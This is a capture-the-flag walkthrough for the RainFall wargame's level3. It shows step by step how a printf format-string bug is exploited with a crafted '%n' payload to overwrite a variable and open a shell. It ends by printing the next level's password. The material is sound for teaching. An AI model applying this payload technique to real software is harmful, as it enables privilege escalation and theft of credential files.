# Level3 Exploit

## Steps

### 1. Decompile the Binary

Use GDB to disassemble the `main` and `v` functions:

```bash
level3@RainFall:~$ gdb level3
(gdb) disassemble main
(gdb) disassemble v
```

You can convert the assembly code to C using the [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter) tool for better understanding.

### 2. Check Available Functions

Examine the available functions to identify any potential vulnerabilities:
- The `main` function calls a function `v`.
- The `v` function contains a call to `printf` without format string specifiers, making it vulnerable to format string attacks.
- The `v` function uses an undeclared variable `m`. If `m` is set to `0x40` (64 in decimal), it will launch a shell.

### 3. Find the Variable Address

Use GDB to find the address of the variable `m`:

```bash
level3@RainFall:~$ gdb level3
(gdb) info var
```

Identify the address of `m`, for example: `0x0804988c`.

### 4. Determine Format String Offset

Determine at which position `printf` starts to write the given string. Use this input string in GDB:

```bash
level3@RainFall:~$ gdb level3
(gdb) run
(gdb) AAAAAAAAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
```

You should see output similar to:

```
AAAAAAAAAAA00000200.b7fd1ac0.b7ff37d0.41414141.41414141.25414141.2e783830.78383025.3830252e
```

Here, the value `41414141` (which corresponds to `AAAA` in ASCII) appears. We find that the `printf` argument position is at the 4th position.

### 5. Create the Exploit

Now we have all the information to exploit the format string vulnerability:
- The address of `m` in little-endian format is `\x8c\x98\x04\x08`.
- We need to put the value `64` (0x40) in the 4th position of the stack preceding the `printf` call stack use.

Construct the input string using Python:

```bash
python -c 'print("\x8c\x98\x04\x08%60d%4$n")'
```

`%60d` will write 60 bytes on the standard output, and `%4$n` means to put the preceding content size (`%60d` (=60) + address string (4 length) = 64) at the fourth chunk before the `printf` stack use.

### 6. Run the Exploit

Run the exploit, keeping `stdin` open:

```bash
level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08%60d%4$n")' ; cat) | ./level3
```

Once the shell is opened, you can execute commands:

```bash
$ whoami
level4
$ cat /home/user/level4/.pass  
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

### Explanation

1. **Format String Vulnerability**: `printf` without format specifiers allows for unintended memory reads and writes.
2. **%n Specifier**: Used to write the number of bytes printed so far to an address specified on the stack.
3. **Offset Calculation**: Determining where the format string parameters are on the stack to correctly position the address of `m`.
4. **Exploit String**: Crafted to write the desired value (`64`) to the variable `m`.